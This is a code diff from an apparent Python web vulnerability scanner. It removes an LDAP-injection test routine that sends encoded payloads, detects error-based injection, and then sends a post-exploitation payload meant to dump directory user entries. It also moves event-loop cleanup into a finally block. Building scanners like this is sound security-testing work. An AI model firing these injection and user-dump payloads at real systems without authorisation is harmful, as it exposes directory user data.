@@ -4672,29 +4672,6 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
                 print(f"{Fore.RED}[-] AI Assistant Error for Brute Force Login: {e}{Style.RESET_ALL}")
                 return f"AI Assistant Error: {e}"
 
-        async def test_single_ldap_payload(point, payload):
-            for encoded_p in get_encoded_payloads(payload):
-                test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + encoded_p, point['form_data'], point['original_query'])
-                res, request_details, response_details = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
-
-                if res and await res.text() and any(e in (await res.text()).lower() for e in ldap_errors):
-                    output.print(f"  [CRITICAL] Error-Based LDAP Injection confirmed in {point['method'].upper()} param '{point['param']}' with payload: {encoded_p}")
-                    evidence = f"Vulnerable URL: {test_url}\nPayload: {encoded_p}\n\n--- Response Snippet (Error Message) ---\n{(await res.text())[:400]}\n---"
-                    
-                    dump_payload = "(&(objectClass=*)(uid=*))"
-                    dump_url, dump_data = build_request(point['url'], point['method'], point['param'], point['value'] + dump_payload, point['form_data'], point['original_query'])
-                    res_dump, _, _ = await _send_async_http_request(dump_url, method=point['method'], data=dump_data, output=output, session_cookies=session_cookies)
-                    if res_dump and await res_dump.text() and not any(e in (await res_dump.text()).lower() for e in ldap_errors):
-                        evidence += f"\n\n--- Post-Exploitation (User Dump Attempt) ---\nPayload: {dump_payload}\nResponse Snippet:\n{(await res_dump.text())[:500]}\n---"
-                        output.print(f"    [SUCCESS] Post-exploitation payload sent. Response may contain user data.")
-
-                    report.add_finding("LDAP Injection", "Critical", point['url'], point['param'], encoded_p,
-                                       "The application is vulnerable to LDAP Injection, allowing query manipulation.",
-                                       "Use parameterized LDAP queries or a safe query construction library. Sanitize all user input used in LDAP filters.",
-                                       evidence, method=point['method'], request_details=request_details, response_details=response_details)
-                    return True
-            return False
-
     async def run_smart_probe(point):
         output.print(f"  [Phase 1] Running Smart Probe for LDAP Injection on param '{point['param']}'...")
         for payload in ldap_probes:
@@ -6995,6 +6972,7 @@ def _run_single_attack(args):
     """Helper function to run a single attack; designed to be called by ThreadPoolExecutor."""
     attack_func, url, form_to_test, base_url, output_handler, tech, report, session_cookies, ai_enabled, discovered_urls, discovered_forms, nmap_output_file_path = args # Added nmap_output_file_path
     check_name = f"{attack_func.__name__} on {url.split('/')[-1][:30]}"
+    loop = None
     try:
         report.add_check(check_name, "Started")
         
@@ -7034,13 +7012,15 @@ def _run_single_attack(args):
 
         loop.run_until_complete(attack_func(**kwargs))
 
-        loop.close()
         report.add_check(check_name, "Completed")
     except Exception as e:
         import traceback
         error_traceback = traceback.format_exc()
         output_handler.print(f"\n[FATAL ERROR] in {attack_func.__name__} on {url}: {repr(e)}\nTraceback:\n{error_traceback}")
         report.add_check(check_name, f"Error: {repr(e)}\nTraceback: {error_traceback}")
+    finally:
+        if loop:
+            loop.close()
 
 async def run_all_attacks(target, output_handler, tech, report, session_cookies=None, ai_enabled=False, ai_reorder_attacks=False, scan_type='full'): # Added scan_type
     base_url = normalize_target(target)
